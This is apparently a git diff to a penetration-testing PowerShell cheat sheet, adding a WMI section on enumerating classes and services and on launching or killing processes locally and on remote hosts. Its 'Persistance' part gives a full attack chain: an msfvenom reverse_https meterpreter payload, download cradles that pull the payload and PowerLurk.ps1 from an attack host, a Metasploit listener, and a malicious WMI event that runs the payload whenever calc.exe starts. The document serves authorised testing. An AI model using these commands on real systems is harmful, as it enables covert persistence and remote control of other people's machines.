@@ -153,6 +153,93 @@ PS C:\> $ports=(80, 443); $ip="10.0.0.1"; foreach ($port in $ports) {try {$socke
 
 # [From Meterpreter](../../../Metasploit/README.MD#PowerShell)
 
+# WMI
+##### List Commands
+```powershell
+PS C:\> Get-Help WMI
+```
+##### List all namespaces within root/cimv2 namespace and all namespace classes
+```powershell
+PS C:\> Get-WmiObject -Namespace "root/cimv2" -Class "__Namespace"
+PS C:\> Get-WmiObject -Namespace "root/cimv2" -Class "__Namespace" | Select-Object Name
+```
+##### List all classes within specific namespace
+```powershell
+PS C:\> Get-WmiObject -Namespace "root/cimv2" -List
+PS C:\> Get-WmiObject -Namespace "root/cimv2" -List | Where-Object {$_.Name -Match "Win32_Service"}
+```
+##### Return all services configured on system
+```powershell
+PS C:\> Get-WmiObject -Class Win32_Service
+PS C:\> Get-WmiObject -Class Win32_Service |  Where-Object {$_.State "Running"}
+PS C:\> Get-WmiObject -Class Win32_Service |  Where-Object {$_.Name "Defend"}
+```
+##### List Processes
+```powershell
+PS C:\> Get-WmiObject -Class Win32_Process -List
+PS C:\> Get-WmiObject -List Win32_Process
+```
+##### List Class Methods
+```powershell
+PS C:\> Get-WmiObject -List Win32_Process | Get-Member -MemberType Method
+```
+##### Launch Process
+```powershell
+# Processes instantiated under this will run as child processes under WmiPrvSE.exe
+PS C:\> $proc = Get-WmiObject -List Win32_Process
+PS C:\> $proc.Create("cmd.exe")
+
+# Alternate method.
+PS C:\> Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList cmd.exe
+```
+### Remote System
+##### Launch Process on a Remote System
+```powershell
+PS C:\> Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList cmd.exe -ComputerName [Remote Host] -Credential [Username]
+```
+##### Get Process Class for Process Created on Remote System
+```powershell
+PS C:\> Get-WmiObject -Class Win32_Process -Filter {ProcessId = "[Process ID]"} -ComputerName [Remote Host] -Credential [Username]
+```
+##### Kill Process on Remote System
+```powershell
+PS C:\> Get-WmiObject -Class Win32_Process -Filter {ProcessId = "[Process ID]"} -ComputerName [Remote Host] -Credential [Username] | Remove-WmiObject
+```
+### Persistance
+* Generate meterpreter payload.
+```bash
+msfvenom -p windows/meterpreter/reverse_https LHOST=[Attack Host] LPORT=443 -f exe > payload.exe
+```
+* Start HTTP Server.
+```bash
+python -m SimpleHTTPServer 80
+```
+* Use Download Cradle to Transfer Payload to Target.
+```powershell
+PS C:\> IEX (New-Object Net.WebClient).DownloadFile('http://[Attack Host]/payload.exe', 'C:\Windows\Tasks\payload.exe')
+```
+* Start meterpreter listener.
+```bash
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST [Attack Host]
+set LPORT 443
+run -j
+```
+* Use Download Cradle to Transfer [PowerLurk](https://github.com/Sw4mpf0x/PowerLurk) to Target and Install Malicious WMI Event.
+```powershell
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://[Attack Host]/PowerLurk.ps1'); Register-MaliciousWmiEvent -EventName CalcExec -PermanentCommand "cmd.exe /c C:\Windows\Tasks\payload.exe" -Trigger ProcessStart -ProcessName calc.exe
+```
+* View Malicious WMI Event
+```powershell
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://[Attack Host]/PowerLurk.ps1'); Get-WmiEvent -Name CalcExec
+```
+* Remove Malcious WMI Event
+```powershell
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://[Attack Host]/PowerLurk.ps1'); Get-WmiEvent -Name CalcExec | Remove-WmiObject
+```
+
 # Tools
 ##### [Empire](https://github.com/EmpireProject/Empire)
 ##### [Get-HttpStatus](https://powersploit.readthedocs.io/en/latest/Recon/Get-HttpStatus/)
@@ -161,6 +248,8 @@ PS C:\> $ports=(80, 443); $ip="10.0.0.1"; foreach ($port in $ports) {try {$socke
 ##### [Invoke-Portscan](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1)
 ##### [Nishang](https://github.com/samratashok/nishang)
 ##### [Posh-SecMod](https://powersploit.readthedocs.io/en/latest/Recon/Get-HttpStatus/)
+##### [PowerLurk](https://github.com/Sw4mpf0x/PowerLurk)
+* [Creeping on Users with WMI Events: Introducing PowerLurk](https://pentestarmoury.com/2016/07/13/151/)
 ##### [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
 ##### [psgetsystem](https://github.com/decoder-it/psgetsystem)
 ##### [SessionGopher](https://github.com/Arvanaghi/SessionGopher)
